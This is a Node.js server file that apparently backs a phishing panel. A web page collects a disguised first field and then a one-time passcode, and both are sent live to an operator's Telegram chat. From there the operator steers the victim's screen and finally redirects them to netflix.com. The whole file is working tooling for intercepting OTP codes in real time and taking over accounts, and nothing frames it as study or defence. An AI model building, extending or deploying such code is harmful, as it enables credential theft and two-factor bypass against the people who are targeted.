require("dotenv").config();

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static(__dirname));

// ===== SESSION STORAGE =====
const sessions = {};

const bot = new Telegraf(process.env.BOT_TOKEN);

// ===== WEBSITE CONNECT =====
io.on("connection", (socket) => {
  console.log("Website connected:", socket.id);

  socket.on("start_session", () => {
    sessions[socket.id] = {
      status: "waiting_for_user_input",
      favorite_food: null,
      admin_choice: null,
      admin_value: null,
      otp_code: null,
      awaitingAdminReply: false
    };

    socket.emit("session_created", { sessionId: socket.id });
  });

  socket.on("submit_food", async (data) => {
    const session = sessions[data.sessionId];
    if (!session) return;

    session.favorite_food = data.food;
    session.status = "waiting_for_admin_choice";

    await bot.telegram.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `New Submission\nSession: ${data.sessionId}\nFavorite food: ${data.food}`,
      Markup.inlineKeyboard([
        [
          Markup.button.callback("A", `A:${data.sessionId}`),
          Markup.button.callback("B", `B:${data.sessionId}`),
          Markup.button.callback("C", `C:${data.sessionId}`)
        ],
        [
          Markup.button.callback("Back", `BACK:${data.sessionId}`)
        ]
      ])
    );
  });

  // ===== OTP VERIFY FROM SCREEN C =====
  socket.on("submit_code", async (data) => {
    const session = sessions[data.sessionId];
    if (!session) return;

    session.otp_code = data.code;
    session.status = "otp_submitted";

    await bot.telegram.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `OTP Submitted\nSession: ${data.sessionId}\nCode: ${data.code}`,
      Markup.inlineKeyboard([
        [
          Markup.button.callback("Proceed", `PROCEED:${data.sessionId}`),
          Markup.button.callback("Back", `FINALBACK:${data.sessionId}`)
        ]
      ])
    );

    console.log("OTP received:", data.code);
  });
});

// ===== TELEGRAM BUTTON CLICK =====
bot.on("callback_query", async (ctx) => {
  const [action, sessionId] = ctx.callbackQuery.data.split(":");
  const session = sessions[sessionId];
  if (!session) return;

  // BACK from first stage
  if (action === "BACK" && session.status === "waiting_for_admin_choice") {
    io.to(sessionId).emit("reset_food");
    session.status = "waiting_for_user_input";
    await ctx.reply("User sent back to food input.");
    return;
  }

  // A B C selection
  if (["A", "B", "C"].includes(action)) {
    session.admin_choice = action;
    session.status = "waiting_for_admin_input";
    session.awaitingAdminReply = true;

    await ctx.reply(`You selected ${action}. Enter instruction for session ${sessionId}`);
    return;
  }

  // FINAL DECISION BUTTONS
  if (action === "PROCEED") {
    io.to(sessionId).emit("redirect_user", {
      url: "https://netflix.com"
    });

    session.status = "completed_redirect";
    session.awaitingAdminReply = false;

    await ctx.reply("User redirected.");
    return;
  }

  if (action === "FINALBACK") {
    io.to(sessionId).emit("reset_food");

    session.status = "waiting_for_user_input";
    session.awaitingAdminReply = false;

    await ctx.reply("User sent back to start.");
    return;
  }
});

// ===== TELEGRAM TEXT INPUT (Instruction Sender) =====
bot.on("text", async (ctx) => {
  const text = ctx.message.text;

  // find session waiting for admin reply
  const sessionId = Object.keys(sessions).find(
    id => sessions[id].awaitingAdminReply === true
  );

  if (!sessionId) return;

  const session = sessions[sessionId];
  if (session.status !== "waiting_for_admin_input") return;

  session.admin_value = text;
  session.status = "waiting_for_admin_final_decision";
  session.awaitingAdminReply = false;

  io.to(sessionId).emit("session_completed", {
    choice: session.admin_choice,
    value: text
  });

  await ctx.reply(
    "Instruction sent.",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("Proceed", `PROCEED:${sessionId}`),
        Markup.button.callback("Back", `FINALBACK:${sessionId}`)
      ]
    ])
  );
});

bot.launch();

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
